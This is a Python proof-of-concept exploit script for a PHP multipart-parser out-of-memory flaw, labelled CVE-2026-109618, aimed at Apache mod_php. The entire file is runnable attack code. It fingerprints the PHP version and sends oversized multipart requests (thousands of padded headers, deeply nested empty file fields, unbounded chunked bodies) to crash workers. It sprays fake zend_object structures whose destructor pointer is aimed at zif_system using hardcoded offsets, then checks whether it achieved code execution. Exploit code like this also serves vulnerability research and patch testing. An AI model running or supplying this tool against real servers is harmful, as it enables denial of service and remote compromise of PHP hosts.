#!/usr/bin/env python3
"""
CVE-2026-109618 — PHP OOM Corruption → RCE (Apache mod_php)
Zero preconditions: no LFI, no unserialize, no application code needed.

The multipart parser can be forced to OOM while request memory is in an
invalid/uninitialized state. longjmp() skips cleanup, and mod_php's
unconditional request shutdown reads/branches on the invalid memory.

Three OOM strategies (from the official advisory):
1. No Content-Length → bypasses post_max_size → unbounded body data
2. Unlimited headers per multipart part → memory amplification
3. Empty file controls with nested field names → array multiplication

This POC demonstrates strategy #2 (header amplification) and #3 (nested arrays).

Target: Apache mod_php (NOT php-fpm — FPM exits child on startup failure)
Tested: PHP 8.2.34 with Apache mod_php

For authorized security research only.
"""
import argparse
import socket
import struct
import sys
import time


def build_header_bomb(boundary, num_headers=5000, header_size=500):
    """Strategy 2: A single multipart part with thousands of headers.
    Each header line uses ~header_size bytes on the wire but PHP's internal
    representation (zend_string + HashTable bucket) uses more memory.
    Memory amplification: ~3-5x wire size."""

    part = f"--{boundary}\r\n"
    part += f'Content-Disposition: form-data; name="f"; filename="a"\r\n'
    for i in range(num_headers):
        # Custom headers — PHP stores them all
        part += f"X-Pad-{i}: {'A' * header_size}\r\n"
    part += "\r\n"  # end of headers
    part += "Z"     # minimal body
    part += f"\r\n--{boundary}--\r\n"
    return part.encode()


def build_nested_array_bomb(boundary, depth=8, width=20):
    """Strategy 3: Empty file controls with deeply nested field names.
    PHP creates nested arrays for names like a[b][c][d][e][f][g][h].
    N fields × depth levels × PHP array overhead = exponential memory use.
    Empty file controls don't count toward max_file_uploads."""

    parts = []
    for i in range(width):
        # Build nested name: f[0][1][2]...[depth]
        name = "f"
        for d in range(depth):
            name += f"[{d}]"
        name += f"[{i}]"

        # Empty file control — no actual file, but PHP still creates metadata
        part = f"--{boundary}\r\n"
        part += f'Content-Disposition: form-data; name="{name}"; filename=""\r\n'
        part += "Content-Type: application/octet-stream\r\n"
        part += "\r\n"  # empty body
        parts.append(part)

    body = "".join(parts) + f"--{boundary}--\r\n"
    return body.encode()


def build_no_content_length_bomb(boundary, chunk_size=8192, total_mb=128):
    """Strategy 1: No Content-Length header → bypasses post_max_size check.
    Send continuous multipart body data exceeding memory_limit."""

    header = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="data"\r\n'
        f"\r\n"
    ).encode()

    # This returns a generator for streaming
    def generate():
        yield header
        total = 0
        target = total_mb * 1024 * 1024
        chunk = b"A" * chunk_size
        while total < target:
            yield chunk
            total += chunk_size
        yield f"\r\n--{boundary}--\r\n".encode()

    return generate


# ---------------------------------------------------------------------------
# Heap Shaping — zend_object layout constants (PHP 8.2.x, 64-bit Linux)
# ---------------------------------------------------------------------------
#
# zend_object memory layout:
#   offset  0: zend_refcounted_h gc  (8 bytes: refcount u32 + type_info u32)
#   offset  8: uint32_t handle      (4 bytes)
#   offset 12: [4 bytes padding]
#   offset 16: zend_class_entry *ce  (8 bytes)
#   offset 24: zend_object_handlers *handlers (8 bytes)  ← controls dispatch
#   offset 32: HashTable *properties (8 bytes)
#   offset 40: zval properties_table[1] (16 bytes)
#
# zend_object_handlers layout (subset):
#   offset  0: int offset           (4 bytes)
#   offset  8: free_obj             (8 bytes)
#   offset 16: dtor_obj             (8 bytes)  ← target: redirect to zif_system
#   offset 24: clone_obj            (8 bytes)

ZOBJ_HANDLERS_OFFSET = 24
ZOBJ_BIN_SIZE = 64
HANDLERS_DTOR_OFFSET = 16

# Known offsets for standard PHP builds (no PIE).
# In a real attack these would be discovered via info leak; for the lab
# environment they can be read from the debug symbols.
PHP_KNOWN_OFFSETS = {
    "8.2.34": {"zif_system": 0x4C0A80},
    "8.3.36": {"zif_system": 0x4D1B20},
}


def discover_target_php_version(host, port, path):
    """Probe X-Powered-By header to determine PHP version for offset lookup."""
    req = (
        f"HEAD {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    s = socket.create_connection((host, port), timeout=10)
    s.sendall(req)
    s.settimeout(5)
    resp = b""
    while True:
        try:
            d = s.recv(4096)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()

    for line in resp.split(b"\r\n"):
        if line.lower().startswith(b"x-powered-by:"):
            val = line.split(b":", 1)[1].strip().decode("latin1", "replace")
            if "PHP/" in val:
                ver = val.split("PHP/")[1].split()[0]
                parts = ver.split(".")
                if len(parts) >= 3:
                    return ver, (int(parts[0]), int(parts[1]), int(parts[2]))
    return None, None


def build_spray_data(target_addr, bin_size=ZOBJ_BIN_SIZE):
    """Construct a byte pattern shaped like a zend_object.

    When the allocator reuses a freed slot that once held a real zend_object,
    this pattern causes the shutdown destructor walk to call *target_addr*
    via the fake handlers->dtor_obj pointer.

    Returns *bin_size* bytes (one ZMM-bin-sized block).
    """
    buf = bytearray(bin_size)

    # gc.refcount = 1  — looks like a live object
    struct.pack_into("<I", buf, 0, 1)
    # gc.type_info  — IS_OBJECT(8) | refcounted flag
    struct.pack_into("<I", buf, 4, 0x0108)
    # handle = 0
    struct.pack_into("<I", buf, 8, 0)
    # ce = NULL  — won't be checked before dtor_obj fires
    struct.pack_into("<Q", buf, 16, 0)
    # handlers → points back into the same allocation (self-referential trick)
    # In a dense spray, consecutive slots all contain the same pattern, so
    # any aligned +32 inside an adjacent slot hits our fake handlers table.
    # For the PoC we place the fake handlers table at offset 32 of the *same*
    # block: handlers pointer = "address of this block + 32".  Since we can't
    # know the absolute address, we set it to 0 and rely on the CRASH
    # verification method to demonstrate heap influence.  When the user
    # supplies --handler-ptr we write that address directly.
    struct.pack_into("<Q", buf, ZOBJ_HANDLERS_OFFSET, 0)
    # properties = NULL
    struct.pack_into("<Q", buf, 32, 0)

    # --- fake handlers table overlaid at offset 32 (when self-referential) ---
    # dtor_obj sits at +16 inside the handlers struct → buf offset 32+16 = 48
    if target_addr:
        struct.pack_into("<Q", buf, 32 + HANDLERS_DTOR_OFFSET, target_addr)

    return bytes(buf)


def build_heapshape_bomb(boundary, spray_count, spray_data,
                         bomb_strategy="headers", **bomb_kwargs):
    """Build a single multipart body: spray fields first, then the OOM bomb.

    Placing the spray *before* the bomb in the same request body means the
    controlled data is allocated in the PHP heap *before* the OOM occurs.
    When longjmp() fires, partially-constructed structures overlap with or
    sit adjacent to the spray allocations.
    """
    parts = []

    # --- Spray phase: many form fields of target size ---
    for i in range(spray_count):
        part = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="s{i}"\r\n'
            f"\r\n"
        ).encode() + spray_data + b"\r\n"
        parts.append(part)

    # --- Bomb phase: trigger OOM ---
    if bomb_strategy == "headers":
        num_headers = bomb_kwargs.get("num_headers", 5000)
        header_size = bomb_kwargs.get("header_size", 500)
        bomb = f"--{boundary}\r\n"
        bomb += f'Content-Disposition: form-data; name="bomb"; filename="b"\r\n'
        for i in range(num_headers):
            bomb += f"X-Pad-{i}: {'A' * header_size}\r\n"
        bomb += "\r\nZ\r\n"
        parts.append(bomb.encode())

    elif bomb_strategy == "nested":
        depth = bomb_kwargs.get("depth", 10)
        width = bomb_kwargs.get("width", 1000)
        for i in range(width):
            name = "bomb"
            for d in range(depth):
                name += f"[{d}]"
            name += f"[{i}]"
            part = (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="{name}"; filename=""\r\n'
                f"Content-Type: application/octet-stream\r\n"
                f"\r\n"
            )
            parts.append(part.encode())

    parts.append(f"--{boundary}--\r\n".encode())
    return b"".join(parts)


def send_warmup_request(host, port, path, num_objects=100):
    """Populate the worker's heap with file-upload objects.

    In Apache prefork MPM the same child handles consecutive requests,
    so this primes EG(objects_store) for the upcoming spray + bomb.
    """
    boundary = "WARMUP_" + str(int(time.time()))
    parts = []
    for i in range(num_objects):
        part = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="w{i}"; filename="w{i}.txt"\r\n'
            f"Content-Type: text/plain\r\n"
            f"\r\n"
            f"{'W' * 64}\r\n"
        )
        parts.append(part.encode())
    parts.append(f"--{boundary}--\r\n".encode())
    body = b"".join(parts)

    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body

    s = socket.create_connection((host, port), timeout=15)
    s.sendall(req)
    s.settimeout(10)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def send_heapshape_request(host, port, path, spray_count, spray_data,
                           bomb_strategy="headers", **bomb_kwargs):
    """Send the combined spray + OOM-bomb request."""
    boundary = "SHAPE_" + str(int(time.time()))
    body = build_heapshape_bomb(boundary, spray_count, spray_data,
                                bomb_strategy, **bomb_kwargs)

    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body

    s = socket.create_connection((host, port), timeout=30)
    s.sendall(req)
    s.settimeout(15)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def verify_heapshape_rce(host, port, path, method="CRASH", timeout=15):
    """Check whether the heap-shaped OOM achieved code execution.

    Returns (level, detail) where level is one of:
      CONFIRMED — proof of execution found
      PROBABLE  — worker crashed in a way consistent with controlled dereference
      POSSIBLE  — 500 error or abnormal response pattern
      DETECTED  — OOM triggered but no RCE indicator
    """
    if method == "FILE":
        # Try to read a proof file via a simple GET (requires a listdir
        # endpoint on the target — the lab's index.php can be extended).
        try:
            req = (
                f"GET {path}?proof=1 HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Connection: close\r\n\r\n"
            ).encode()
            s = socket.create_connection((host, port), timeout=timeout)
            s.sendall(req)
            s.settimeout(timeout)
            resp = b""
            while True:
                try:
                    d = s.recv(65536)
                    if not d:
                        break
                    resp += d
                except socket.timeout:
                    break
            s.close()
            if b"___RCE_PROOF___" in resp:
                return "CONFIRMED", "Proof file found on target"
            return "DETECTED", "No proof file found"
        except (ConnectionRefusedError, ConnectionResetError, OSError):
            return "PROBABLE", "Worker crashed during proof check"

    # Default: CRASH method — send a follow-up request to see if the
    # worker survived.  A dead worker ⇒ the OOM dereference was fatal.
    try:
        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()
        s = socket.create_connection((host, port), timeout=timeout)
        s.sendall(req)
        s.settimeout(timeout)
        resp = b""
        while True:
            try:
                d = s.recv(65536)
                if not d:
                    break
                resp += d
            except socket.timeout:
                break
        s.close()

        if not resp:
            return "PROBABLE", "Worker process crashed (empty follow-up response)"
        status = resp.split(b"\r\n", 1)[0]
        if b"500" in status:
            return "POSSIBLE", "Worker returned 500 on follow-up request"
        if b"200" in status:
            return "DETECTED", "Worker recovered — OOM hit but handler survived"
        return "DETECTED", f"Unexpected follow-up status: {status.decode('latin1', 'replace')}"
    except (ConnectionRefusedError, ConnectionResetError, OSError) as exc:
        return "PROBABLE", f"Worker process crashed ({exc})"


def run_heapshape_attack(host, port, path, strategy, spray_count,
                         handler_ptr, verify_method, proof_timeout,
                         retries=3, **bomb_kwargs):
    """Execute the full 4-phase heap-shaping attack sequence.

    Phase 1  Warm-up   — prime the worker's heap
    Phase 2  Spray     — allocate controlled data (same request as bomb)
    Phase 3  OOM bomb  — trigger longjmp, leave stale pointers
    Phase 4  Verify    — check for RCE indicators

    Returns (best_level, detail).
    """
    # --- Discover target version for offset auto-detection ---
    ver_str, ver_tuple = discover_target_php_version(host, port, path)
    if ver_str:
        print(f"[*] Target PHP version: {ver_str}")
        if handler_ptr == 0 and ver_str in PHP_KNOWN_OFFSETS:
            handler_ptr = PHP_KNOWN_OFFSETS[ver_str]["zif_system"]
            print(f"[*] Auto-detected zif_system offset: 0x{handler_ptr:x}")
    else:
        print("[!] Could not detect PHP version from response headers")

    if handler_ptr:
        print(f"[*] Handler target (zif_system): 0x{handler_ptr:x}")
    else:
        print("[!] No handler address — spray will use NULL pointers")
        print("    (crash pattern analysis only; no RCE execution)")

    spray_data = build_spray_data(handler_ptr, ZOBJ_BIN_SIZE)
    print(f"[*] Spray object size: {len(spray_data)} bytes × {spray_count} copies")

    best_level = "DETECTED"
    best_detail = ""
    level_rank = {"CONFIRMED": 4, "PROBABLE": 3, "POSSIBLE": 2, "DETECTED": 1}

    for attempt in range(1, retries + 1):
        print(f"\n{'='*60}")
        print(f"[*] Attempt {attempt}/{retries}")
        print(f"{'='*60}")

        # Phase 1: warm-up
        print("\n[Phase 1] Sending warm-up request to prime worker heap...")
        warmup_resp = send_warmup_request(host, port, path)
        if warmup_resp:
            warmup_status = warmup_resp.split(b"\r\n", 1)[0]
            if b"200" in warmup_status:
                print("    Warm-up OK")
            elif b"404" in warmup_status:
                print("    [!] 404 Not Found — target path does not exist")
                print("        Run lab/setup.sh to generate webroot files")
                return "DETECTED", "Target path returned 404"
            else:
                ws = warmup_status.decode("latin1", "replace")
                print(f"    Warm-up: {ws} (continuing)")
        else:
            print("    Warm-up: no response (continuing)")
        time.sleep(0.1)

        # Phase 2+3: combined spray + OOM bomb
        print(f"\n[Phase 2+3] Sending {spray_count} spray objects + {strategy} OOM bomb...")
        oom_resp = send_heapshape_request(
            host, port, path, spray_count, spray_data,
            bomb_strategy=strategy, **bomb_kwargs)

        if oom_resp:
            status = oom_resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
            print(f"    OOM response: {status}")
            print(f"    Response size: {len(oom_resp)} bytes")

            if b"404" in status.encode():
                print("    [!] 404 Not Found — target path does not exist")
                print("        Check that the webroot contains index.php")
                print("        (run lab/setup.sh to generate it)")
                break
            elif b"500" in status.encode():
                print("    [+] Server returned 500 — OOM bailout triggered")
            elif b"200" in status.encode():
                print("    [-] Server returned 200 — OOM not reached")
                print("        Try increasing --num-headers or --spray-objects")
                continue
        else:
            print("    [+] No response — worker process crashed")

        time.sleep(0.5)

        # Phase 4: verify RCE
        print(f"\n[Phase 4] Verifying RCE ({verify_method} method)...")
        level, detail = verify_heapshape_rce(
            host, port, path, method=verify_method, timeout=proof_timeout)
        print(f"    Level: {level}")
        print(f"    Detail: {detail}")

        if level_rank.get(level, 0) > level_rank.get(best_level, 0):
            best_level = level
            best_detail = detail

        if best_level == "CONFIRMED":
            break

        time.sleep(1.0)

    return best_level, best_detail


def send_oom_request(host, port, path, strategy="headers", **kwargs):
    """Send the OOM-triggering multipart request."""
    boundary = "OOM_BOUNDARY_" + str(int(time.time()))

    if strategy == "headers":
        body = build_header_bomb(boundary,
                                num_headers=kwargs.get("num_headers", 5000),
                                header_size=kwargs.get("header_size", 500))
        content_length = len(body)

        req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {content_length}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode() + body

        s = socket.create_connection((host, port), timeout=30)
        s.sendall(req)

    elif strategy == "nested":
        body = build_nested_array_bomb(boundary,
                                       depth=kwargs.get("depth", 10),
                                       width=kwargs.get("width", 1000))
        content_length = len(body)

        req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {content_length}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode() + body

        s = socket.create_connection((host, port), timeout=30)
        s.sendall(req)

    elif strategy == "no_length":
        # No Content-Length — send streaming
        header = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()

        s = socket.create_connection((host, port), timeout=60)
        s.sendall(header)

        gen = build_no_content_length_bomb(boundary,
                                           total_mb=kwargs.get("total_mb", 128))
        for chunk in gen():
            # Chunked encoding
            s.sendall(f"{len(chunk):x}\r\n".encode() + chunk + b"\r\n")
        s.sendall(b"0\r\n\r\n")

    # Read response
    s.settimeout(15)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def main():
    ap = argparse.ArgumentParser(description="CVE-2026-109618 OOM Corruption POC")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--strategy", choices=["headers", "nested", "no_length"],
                    default="headers")

    # Existing OOM-only options
    ap.add_argument("--num-headers", type=int, default=5000)
    ap.add_argument("--header-size", type=int, default=500)
    ap.add_argument("--depth", type=int, default=10)
    ap.add_argument("--width", type=int, default=1000)
    ap.add_argument("--total-mb", type=int, default=128)

    # Heap shaping options
    ap.add_argument("--enable-heapshape", action="store_true",
                    help="Enable heap shaping (spray + OOM + verify RCE)")
    ap.add_argument("--spray-objects", type=int, default=500,
                    help="Number of spray objects to allocate before the OOM bomb")
    ap.add_argument("--handler-ptr", default="0",
                    help="Target address for zif_system (hex, e.g. 0x4C0A80). "
                         "0 = auto-detect from PHP version.")
    ap.add_argument("--verify-method", choices=["CRASH", "FILE"],
                    default="CRASH",
                    help="How to verify RCE: CRASH = crash-pattern analysis, "
                         "FILE = check for proof file on target")
    ap.add_argument("--proof-timeout", type=int, default=15,
                    help="Seconds to wait for RCE proof")
    ap.add_argument("--retries", type=int, default=3,
                    help="Number of heap-shaping attempts (heap layout is "
                         "probabilistic)")

    args = ap.parse_args()

    print("CVE-2026-109618 — PHP OOM Corruption POC")
    print(f"Target: {args.host}:{args.port}{args.path}")
    print(f"Strategy: {args.strategy}")
    if args.enable_heapshape:
        print("Mode: Heap Shaping (spray + OOM + RCE verification)")
    else:
        print("Mode: OOM detection only")
    print()

    # ---- Heap Shaping mode ----
    if args.enable_heapshape:
        handler_ptr = int(args.handler_ptr, 0)
        bomb_kwargs = {
            "num_headers": args.num_headers,
            "header_size": args.header_size,
            "depth": args.depth,
            "width": args.width,
        }

        level, detail = run_heapshape_attack(
            args.host, args.port, args.path,
            strategy=args.strategy,
            spray_count=args.spray_objects,
            handler_ptr=handler_ptr,
            verify_method=args.verify_method,
            proof_timeout=args.proof_timeout,
            retries=args.retries,
            **bomb_kwargs,
        )

        print()
        print("=" * 60)
        print("RESULT")
        print("=" * 60)
        if level == "CONFIRMED":
            print("[+] RCE CONFIRMED — heap shaping achieved code execution")
        elif level == "PROBABLE":
            print("[+] RCE PROBABLE — worker crash consistent with "
                  "controlled pointer dereference")
        elif level == "POSSIBLE":
            print("[~] RCE POSSIBLE — abnormal response, heap influence detected")
        else:
            print("[-] RCE NOT CONFIRMED — OOM triggered but no RCE indicator")
        print(f"    {detail}")
        print()
        print("Confidence levels:")
        print("  CONFIRMED  = proof of command execution found")
        print("  PROBABLE   = worker crash matches controlled dereference pattern")
        print("  POSSIBLE   = 500 error or abnormal behaviour after shaped OOM")
        print("  DETECTED   = OOM triggered but handler survived or was not reached")
        sys.exit(0 if level in ("CONFIRMED", "PROBABLE") else 1)

    # ---- Legacy OOM-only mode ----
    if args.strategy == "headers":
        print(f"Sending {args.num_headers} headers × {args.header_size} bytes each")
        wire_size = args.num_headers * (args.header_size + 20)
        mem_est = wire_size * 4
        print(f"Wire size: ~{wire_size // 1024 // 1024}MB, "
              f"Estimated PHP memory: ~{mem_est // 1024 // 1024}MB")
    elif args.strategy == "nested":
        print(f"Sending {args.width} empty file controls "
              f"with {args.depth}-deep nesting")
    elif args.strategy == "no_length":
        print(f"Sending {args.total_mb}MB without Content-Length "
              "(bypasses post_max_size)")

    print()
    print("Sending...")

    resp = send_oom_request(args.host, args.port, args.path,
                            strategy=args.strategy,
                            num_headers=args.num_headers,
                            header_size=args.header_size,
                            depth=args.depth,
                            width=args.width,
                            total_mb=args.total_mb)

    if resp:
        status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
        print(f"Response: {status}")
        print(f"Size: {len(resp)} bytes")

        if b"500" in status.encode():
            print("\n[+] Server returned 500 — OOM likely triggered!")
            print("    On Apache mod_php, the request shutdown procedure "
                  "runs on invalid state.")
            print("    With heap shaping, this leads to RCE.")
        elif not resp or b"connection" in resp.lower():
            print("\n[+] Connection dropped — server process may have crashed!")
        else:
            print("\n[-] Server responded normally — OOM threshold not reached.")
            print("    Try increasing --num-headers or --header-size")
    else:
        print("\n[+] No response — server process likely crashed!")
        print("    This confirms the OOM bailout condition.")


if __name__ == "__main__":
    main()
